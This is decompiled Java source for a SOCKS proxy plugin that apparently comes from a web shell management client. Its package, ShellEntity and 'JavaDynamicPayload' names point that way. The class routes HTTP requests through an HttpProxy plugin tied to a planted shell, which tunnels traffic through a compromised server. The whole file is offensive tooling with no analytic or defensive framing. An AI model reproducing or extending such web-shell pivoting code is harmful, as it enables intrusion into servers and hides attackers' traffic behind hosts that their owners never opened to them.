/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.plugins.java;

import com.httpProxy.server.request.HttpRequest;
import com.httpProxy.server.response.HttpResponse;
import core.annotation.PluginAnnotation;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.socksServer.HttpRequestHandle;
import core.ui.component.dialog.GOptionPane;
import javax.swing.JPanel;
import shells.plugins.generic.HttpProxy;
import shells.plugins.generic.SocksProxy;

@PluginAnnotation(payloadName="JavaDynamicPayload", Name="SocksProxy", DisplayName="Socks\u4ee3\u7406")
public class JSocksProxy
extends SocksProxy
implements HttpRequestHandle {
    ShellEntity shellEntity;
    HttpProxy httpProxy;

    public JSocksProxy() {
        super(null);
    }

    @Override
    public HttpResponse sendHttpRequest(HttpRequest httpRequest) {
        this.httpProxy.load();
        return this.httpProxy.sendHttpRequest(httpRequest);
    }

    @Override
    public void init(ShellEntity shellEntity) {
        super.init(shellEntity);
        this.shellEntity = shellEntity;
        Plugin plugin = this.shellEntity.getFrame().getPlugin("HttpProxy");
        if (plugin != null) {
            this.httpProxy = (HttpProxy)plugin;
            super.setHttpRequestHandle(this);
        } else {
            GOptionPane.showMessageDialog(super.getView(), "\u672a\u627e\u5230HttpProxy\u63d2\u4ef6!", "\u63d0\u793a", 0);
        }
    }

    @Override
    public JPanel getView() {
        return super.getView();
    }
}

